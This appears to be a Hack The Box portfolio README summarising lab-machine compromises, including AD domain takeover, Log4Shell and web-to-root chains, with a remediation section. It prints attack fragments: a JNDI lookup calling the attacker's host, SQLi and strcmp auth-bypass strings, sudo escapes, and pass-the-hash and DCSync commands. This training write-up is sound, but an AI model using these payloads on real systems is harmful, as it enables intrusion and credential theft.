# Hack The Box — Penetration Testing Portfolio

**Rajan Pyakurel** · Offensive Security Practice Log
**HTB profile:** https://app.hackthebox.com/public/users/3934959
**GitHub:** github.com/techkarmi/hands-on-offsec

> Blue-team roots, red-team heart. I came from years of ISP network engineering and
> infrastructure administration (FTTH/PPPoE provisioning, switch hardening, Windows
> Server + Active Directory, Linux/VPS management), so I approach every target the way
> I used to defend one: find where the network actually cracks. This portfolio
> documents 26 machines I compromised end to end, from the Starting Point tiers through
> a retired Active Directory domain controller. Every box follows one repeatable
> methodology, and every writeup records not just the clean solution but the real
> problems I hit and how I worked through them.
>
> No flag values are published, in line with HTB policy. Active-machine writeups are
> never included.

---

## Repository layout

```
README.md                         this report (start here)
01-starting-point/
  tier-0/   Meow, Fawn, Dancing, Redeemer, Explosion, Preignition, Mongod, Synced
  tier-1/   Appointment, Sequel, Crocodile, Responder, Three, Ignition, Bike,
            Funnel, Pennyworth, Tactics
  tier-2/   Archetype, Oopsie, Vaccine, Unified, Included, Markup, Base
02-retired/
  forest.md   flagship: full Active Directory domain takeover
images/       proof screenshots (see images/README.md for the shot-list)
```

**Where to start reading:** the flagship [Forest](02-retired/forest.md) (AD domain
takeover), then the Tier 2 multi-stage chains such as
[Unified](01-starting-point/tier-2/04-unified.md) (Log4Shell),
[Oopsie](01-starting-point/tier-2/02-oopsie.md) (four chained vulnerabilities), and
[Included](01-starting-point/tier-2/05-included.md) (LFI + lxd escape). The Starting
Point Tier 0 boxes are deliberately brief; the depth is in Tier 2 and the retired box.

---

## 1. At a glance

| Category | Count | Representative boxes |
|---|---:|---|
| Boxes rooted end to end | 26 | Forest, Unified, Oopsie, Included, Archetype |
| Active Directory / Windows | 6 | Forest (DC), Archetype, Tactics, Dancing, Explosion, Markup |
| Web application to RCE | 8 | Oopsie, Unified, Bike, Three, Included, Base, Markup, Ignition |
| Linux privilege escalation | 5 | Vaccine, Oopsie, Included, Base (GTFOBins, PATH hijack, lxd, sudo) |
| Database / service exploitation | 7 | Archetype (MSSQL), Mongod, Sequel, Redeemer, Funnel, Meow, Synced |
| Pivoting / tunnelling | 2 | Funnel, Unified |

**Difficulty spread:** 23 Very Easy (Starting Point Tiers 0-2), 2 Easy/Medium
(Forest, plus AD-pattern chains), with the Tier 2 set being genuine multi-stage
exploit chains rather than single-trick boxes.

---

## 2. Skills demonstrated

**Active Directory (my focus area):**
AS-REP Roasting, Kerberoasting, BloodHound attack-path analysis, ACL/DACL abuse
(Account Operators -> Exchange Windows Permissions -> WriteDACL), DCSync, Pass-the-Hash,
MSSQL `xp_cmdshell` to OS command execution, PowerShell history credential looting,
Impacket (psexec/wmiexec/secretsdump/GetNPUsers), evil-winrm, NetExec/CrackMapExec.

**Web application exploitation:**
SQL injection (auth bypass + sqlmap `--os-shell`), Server-Side Template Injection
(Handlebars -> RCE), XML External Entity (XXE) file disclosure, Log4Shell
(CVE-2021-44228) via JNDI/LDAP, broken access control + IDOR, PHP type-juggling auth
bypass (`strcmp`), Local File Inclusion chained to RCE, unrestricted file upload,
misconfigured S3 bucket write-to-RCE, virtual-host discovery, Jenkins Script Console RCE.

**Linux privilege escalation:**
sudo/GTFOBins (`vi`, `find`), SUID + PATH hijacking, `lxd` group container escape,
TTY/shell stabilisation, credential reuse, cron/service review.

**Network services and data stores:**
FTP (anonymous + credential leaks), SMB (null sessions, admin shares, RID enumeration),
rsync, Redis, MongoDB, MySQL/MariaDB, PostgreSQL, Telnet, RDP.

**Pivoting and post-exploitation:**
SSH local port forwarding to reach localhost-only services, Responder NTLM capture +
offline cracking, reverse-shell delivery and stabilisation across Linux and Windows.

**Tooling:**
Nmap, Gobuster, Burp Suite, Impacket suite, NetExec/CrackMapExec, BloodHound, evil-winrm,
PowerView, Responder, hashcat, John the Ripper, sqlmap, rogue-jndi, Ligolo-ng/Chisel
(AD lab practice), smbclient/smbmap, tftp, aws-cli.

---

## 3. Methodology

Every box in this portfolio was worked with the same loop, the one I'd carry into a
real engagement:

1. **Reconnaissance** — full TCP sweep (`nmap -p-`), then targeted service and script
   scans on open ports. UDP sweep when TCP looks empty.
2. **Enumeration** — interrogate every service for its own weakness: anonymous access,
   default creds, exposed data, version-to-CVE mapping, directory/vhost/user discovery.
3. **Foothold** — exploit the service's specific flaw to reach code execution or a
   credential, adapting public exploits by hand rather than relying on automation.
4. **Privilege escalation** — enumerate the host (`sudo -l`, SUID, groups, services,
   PowerShell history, `whoami /priv`), then match a finding to a known technique.
5. **Loot and document** — capture proof, then write the box up in my own words,
   including the mistakes, because the debugging is where the learning lives.

I attempt every box solo first and only consult a solution to unblock a single step,
which is why the writeups below read like real engagements and not copied walkthroughs.

---

## 4. Highlight reel

The strongest chains, the ones worth talking through in an interview. Each shows a full
attack path plus the real friction I worked through.

### 4.1 Forest — Active Directory domain takeover (flagship)
**Windows DC · Easy · AS-REP Roasting -> BloodHound ACL abuse -> WriteDACL -> DCSync -> Pass-the-Hash**

A domain controller compromised end to end without ever learning the Administrator
password.

- **Recon:** 53/88/389/636/445/5985 = textbook DC. Switched straight to AD methodology.
- **Enumeration:** `rpcclient -U "" -N` null session (`enumdomusers`) revealed the
  service account `svc-alfresco`.
- **Foothold:** `svc-alfresco` had *Do not require Kerberos pre-authentication* set, so
  `impacket-GetNPUsers` returned an AS-REP hash; cracked offline with
  `hashcat -m 18200`. Logged in with `evil-winrm`.
- **Privesc:** BloodHound mapped the path `svc-alfresco -> Account Operators ->
  Exchange Windows Permissions -> WriteDACL on the domain`. Abused it with PowerView
  (`Add-DomainObjectAcl ... -Rights DCSync`) to grant myself replication rights, then
  `impacket-secretsdump` (DCSync) dumped the Administrator NTLM hash.
- **Domain Admin:** `impacket-psexec ... -hashes :<NTLM>` (Pass-the-Hash).
- **Why it matters:** this is the canonical AD kill chain and the single clearest
  demonstration of the skills the OSCP AD set tests. One roastable account plus
  over-permissive group ACLs equals total domain compromise.

### 4.2 Unified — Log4Shell (CVE-2021-44228) to domain data
**Linux · the hardest box in the set · JNDI/LDAP RCE -> MongoDB credential overwrite -> SSH root**

- **Recon:** UniFi Network Application 6.4.54 on 8443. Mapped the version to the
  Log4Shell CVE range, then **proved it** out-of-band: `tcpdump` on port 389 while
  injecting `${jndi:ldap://<me>/x}` into the login `remember` field, and watched the
  callback arrive.
- **Exploit:** stood up three moving parts on the attack box, the `rogue-jndi` LDAP +
  HTTP server, a netcat listener, and the trigger request, then fired a base64-encoded
  reverse shell through the JNDI lookup to land a shell as `unifi`.
- **Privesc:** reached the local MongoDB (port 27117), overwrote the administrator
  account's password hash with one I generated, logged into the web UI, and recovered
  the SSH root password stored in the device settings.
- **Real lesson I hit:** the exploit failed for a while because I put my own tun0 IP in
  the curl URL instead of the target's. The rule I took away: in a reverse-connection
  exploit, every field points at *you* except the one request you fire, which points at
  the *victim*. Also learned to kill a stale `rogue-jndi` holding the port, and that
  both 1389 (LDAP) and 8000 (HTTP payload fetch) must be reachable.
- **Why it matters:** Log4Shell was one of the most widespread real vulnerabilities of
  the decade. This box is the full detect-to-exploit workflow against it.

### 4.3 Oopsie — four distinct vulnerabilities chained
**Linux · broken access control -> IDOR -> file-upload RCE -> SUID PATH hijack**

- Logged in as guest, then **tampered the `role` and `user` cookies** to impersonate a
  super admin (broken access control), using an **IDOR** on the `id` parameter to first
  leak the admin's access ID.
- The admin panel's **unrestricted upload** let me drop a PHP shell for RCE as
  `www-data`; found reused DB credentials in `db.php` and `su`'d to the real user.
- **Privesc:** a custom SUID-root binary called `cat` by name, not full path, so I
  **hijacked `$PATH`** with a fake `cat` and inherited root.
- **Real lesson:** the `-c` trick I first tried on the sudo binary was rejected because
  sudo matches the entire command string. The takeaway, which carried into Vaccine, is
  that sudo rules are exact-match and GTFOBins escapes often have to be done
  interactively.

### 4.4 Included — LFI + TFTP to RCE, then lxd container escape to root
**Linux · LFI -> UDP/TFTP upload -> www-data -> credential reuse -> lxd group -> root**

- **The enumeration trap:** a normal TCP scan found only port 80. The foothold service,
  **TFTP, runs over UDP (69)** and was invisible until I ran a UDP sweep. That lesson
  (UDP-scan when a box looks empty) is one I now apply by reflex.
- Local File Inclusion read `/etc/passwd`; TFTP (no auth) let me **upload** a PHP
  reverse shell that the LFI then **executed**. Found a cleartext password in
  `.htpasswd`, `su`'d to the user.
- **Privesc:** the user was in the **`lxd` group**, so I built a privileged Alpine
  container with the host filesystem mounted and read root as container-root.
- **Real lesson:** my first reverse shell failed because a base64 string in a URL
  contains `+`, which a URL decodes to a space, corrupting the payload. Fixed by using a
  self-contained reverse-shell file instead of a cmd parameter.

### 4.5 Archetype — MSSQL to SYSTEM (the Windows creds-to-SYSTEM pattern)
**Windows · anonymous SMB -> MSSQL xp_cmdshell -> PowerShell history -> psexec SYSTEM**

- Null-session SMB exposed a `backups` share holding a `prod.dtsConfig` file with the
  `sql_svc` password in cleartext.
- Logged into MSSQL with Impacket (Windows auth), confirmed sysadmin, enabled
  `xp_cmdshell` for OS command execution as the service account.
- **Privesc:** read the administrator password straight out of
  `ConsoleHost_history.txt` (PowerShell history), then `impacket-psexec` for a SYSTEM
  shell.
- **Real lesson:** the Impacket login failed until I used a forward slash in
  `DOMAIN/user` on the CLI, because bash ate the backslash and dropped me to a Guest
  login. This is the canonical MSSQL-to-SYSTEM chain and shows up constantly in real
  Windows/AD assessments.

### 4.6 Markup — XXE file disclosure to a writable scheduled task
**Windows · default creds -> XXE -> SSH key theft -> writable job.bat -> SYSTEM**

- Default `admin:password`, then an **XXE** in the order-submission XML read daniel's
  SSH private key (`file:///c:/users/daniel/.ssh/id_rsa`); SSH'd in with the key.
- **Privesc:** `C:\Log-Management\job.bat` ran as Administrator on a schedule and was
  world-writable (`BUILTIN\Users:(F)`). Overwrote it with an `nc.exe` reverse shell and
  the scheduled task handed me SYSTEM.
- **Real lesson:** no callback at first because my overwrite had not stuck; now I always
  `type` a file to verify a write before waiting on a scheduled task.

### 4.7 Base — PHP type-juggling auth bypass to sudo GTFOBins
**Linux · strcmp array bypass -> file upload -> credential reuse -> sudo find -> root**

- The login used `strcmp()` loosely compared to `0`, so passing the params as arrays
  (`username[]=&password[]=`) made `strcmp` return `NULL`, and `NULL == 0` is true,
  bypassing auth. Uploaded a PHP shell, found cleartext creds in `config.php`, reused
  them for the system user.
- **Privesc:** `sudo -l` showed `(root) /usr/bin/find`; GTFOBins `find -exec /bin/sh`
  gave root.
- **Real lesson:** after the bypass I kept getting bounced back to the login because the
  bypass authenticated one specific session, and my browser held a different
  `PHPSESSID`. Syncing the cookie fixed it. Small, realistic, and the kind of detail
  that shows I understand session handling, not just the payload.

### 4.8 Vaccine — full chain to a sudo editor escape
**Linux · anonymous FTP -> crack zip/MD5 -> SQLi os-shell -> creds in source -> sudo vi -> root**

- Anonymous FTP gave a password-protected zip; cracked it (`zip2john` + John), cracked
  an MD5 admin hash inside, logged in, then used **sqlmap `--os-shell`** on an
  authenticated SQL injection for RCE. Found the reused DB/sudo password in
  `dashboard.php`.
- **Privesc:** `sudo -l` allowed `/bin/vi` on one file; escaped with `:!/bin/bash`
  (GTFOBins).
- **Real lesson:** the privesc stalled for a long time on a broken TTY over a raw
  reverse shell (vi rendering garbage, ESC misbehaving). I learned the proper shell
  stabilisation sequence (`python3 pty.spawn`, `export TERM=xterm`, `stty raw -echo;
  fg`) and, crucially, that a messy display is not a broken editor, the file had loaded
  fine and I just needed to type the colon command.

---

## 5. Complete box catalog

All 26 machines, organized by tier. Flags omitted per HTB policy.

### Starting Point — Tier 0 (service and credential fundamentals)

| Box | OS | Technique | One-line chain |
|---|---|---|---|
| Meow | Linux | Telnet, blank creds | Open Telnet, log in as root with no password |
| Fawn | Linux | Anonymous FTP | Pull files over anonymous FTP |
| Dancing | Windows | SMB null session | Access `WorkShares` with a null session |
| Redeemer | Linux | Unauthenticated Redis | `redis-cli` -> `keys *` -> read data |
| Explosion | Windows | Exposed RDP | `xfreerdp` as Administrator, blank password |
| Preignition | Linux | Dir brute force + default web creds | Find `/admin.php`, log in `admin:admin` |
| Mongod | Linux | Unauthenticated MongoDB | Connect, `show dbs`, read the collection |
| Synced | Linux | Exposed rsync | List and pull the anonymous `public` module |

*Tier 0 lesson that stuck:* I initially scanned my own VPN IP instead of the target.
Internalising `10.10.x.x = me, 10.129.x.x = target` early saved me on every box after.

### Starting Point — Tier 1 (first real chains)

| Box | OS | Technique | One-line chain |
|---|---|---|---|
| Appointment | Linux | SQLi auth bypass | `admin' -- -` neutralises the password check |
| Sequel | Linux | Default DB creds | MySQL as root, no password, read the table |
| Crocodile | Linux | Creds in FTP + web login | Anonymous FTP leaks a userlist, reuse at `/login.php` |
| Responder | Windows | LFI + Responder NTLM capture | Force auth to my host, capture + crack the NTLMv2 hash |
| Three | Linux | S3 bucket write to RCE | vhost `s3.thetoppers.htb`, upload a PHP shell to the bucket |
| Ignition | Linux | vhost + weak Magento creds | `/etc/hosts` entry, log into `/admin` with `qwerty123` |
| Bike | Linux | Handlebars SSTI to RCE | Reflected email field -> `process.mainModule.require` RCE |
| Funnel | Linux | Default FTP creds + SSH tunnel | Pivot to a localhost-only PostgreSQL via `ssh -L` |
| Pennyworth | Linux | Jenkins Script Console RCE | Weak Jenkins creds -> Groovy reverse shell as root |
| Tactics | Windows | Admin SMB + Impacket | Blank Administrator password -> `psexec` SYSTEM shell |

*Tier 1 lessons that stuck:* Bike taught me to read errors and fix one thing at a time
(quote collisions -> base64; `require` not defined -> `process.mainModule.require`;
short-lived web shell -> grab the flag fast). Funnel taught me pivoting and that the
reused credential follows the user account, not the default `postgres` role, which I
deduced from the onboarding email rather than guessing.

### Starting Point — Tier 2 (multi-stage exploit chains)

| Box | OS | Technique | Covered in highlight reel |
|---|---|---|---|
| Archetype | Windows | MSSQL `xp_cmdshell` -> PowerShell history -> SYSTEM | Yes (4.5) |
| Oopsie | Linux | Broken access control + IDOR -> upload RCE -> SUID PATH hijack | Yes (4.3) |
| Vaccine | Linux | FTP -> crack -> SQLi os-shell -> sudo vi GTFOBins | Yes (4.8) |
| Unified | Linux | Log4Shell (JNDI/LDAP) -> MongoDB -> SSH root | Yes (4.2) |
| Included | Linux | LFI + TFTP -> www-data -> lxd container escape | Yes (4.4) |
| Markup | Windows | XXE -> SSH key -> writable scheduled task -> SYSTEM | Yes (4.6) |
| Base | Linux | strcmp array auth bypass -> upload -> sudo find | Yes (4.7) |

### Retired machines

| Box | OS | Technique | Covered |
|---|---|---|---|
| Forest | Windows (AD DC) | AS-REP Roast -> BloodHound ACL -> WriteDACL -> DCSync -> PtH | Yes (4.1, flagship) |

---

## 6. What this journey taught me (interview talking points)

- **Methodology beats memorisation.** Every box reduced to the same loop: enumerate a
  service for its own weakness, exploit it, enumerate the host, match a finding to a
  technique. I can run that loop on a target I have never seen.
- **Privilege escalation is pattern matching.** sudo rules to GTFOBins, a dangerous
  group (`lxd`/`docker`) to a container escape, a writable file run by a privileged task
  to SYSTEM, PowerShell history to stored creds. I recognise the shape, I do not guess.
- **The debugging is the skill.** My most valuable lessons came from what went wrong:
  the two-IP confusion on Unified, the URL-encoding bug on Included, the session cookie
  on Base, the broken TTY on Vaccine. Real engagements are mostly troubleshooting, and
  these writeups prove I can do it.
- **My background is an advantage.** Years of ISP network support and Active Directory
  administration mean I understand the defender's side: why Kerberos pre-auth matters,
  why localhost-only binding exists, why default credentials persist. I attack with that
  context, and I can explain the remediation as clearly as the exploit.
- **I specialise toward web and AD.** My developer background makes web-app flaws
  (SSTI, XXE, IDOR, type juggling, Log4Shell) intuitive, and my networking background
  makes Active Directory my strongest offensive domain.

---

## 7. Defensive takeaways (every box, every lesson)

Because I came from infrastructure, I document the fix as carefully as the exploit.
Recurring remediations across these boxes:

- **Kill default and blank credentials** everywhere (Meow, Explosion, Sequel,
  Preignition, Ignition, Pennyworth, Tactics, Markup).
- **Do not expose data services unauthenticated** (Redis, MongoDB, rsync, MSSQL); bind
  to localhost and require auth.
- **Never store secrets on anonymous shares or in source** (Crocodile, Archetype,
  Vaccine, Oopsie, Base, Funnel); rotate anything exposed and stop credential reuse.
- **Validate untrusted input** at every parser: parameterise SQL (Appointment, Vaccine),
  disable XML external entities (Markup), keep user input out of templates (Bike),
  patch Log4j / disable JNDI lookups (Unified), use `hash_equals` not loose `strcmp`
  (Base).
- **Lock down file handling:** validate uploads and store them non-executable (Three,
  Oopsie, Included, Base); do not include files by user-supplied name (Included).
- **Apply least privilege on the host:** scope sudo tightly (Vaccine, Base), call
  binaries by absolute path from privileged contexts (Oopsie), keep privileged
  scheduled tasks and their scripts non-writable by users (Markup), and do not place
  users in `lxd`/`docker` without cause (Included).
- **Harden Active Directory:** enforce Kerberos pre-authentication, tier and audit
  privileged group membership, and alert on DCSync replication from non-DC accounts
  (Forest).

---

*Documenting retired and Starting Point machines for education. No active-machine
writeups, no flag values. Terminal output and screenshots are my own.*
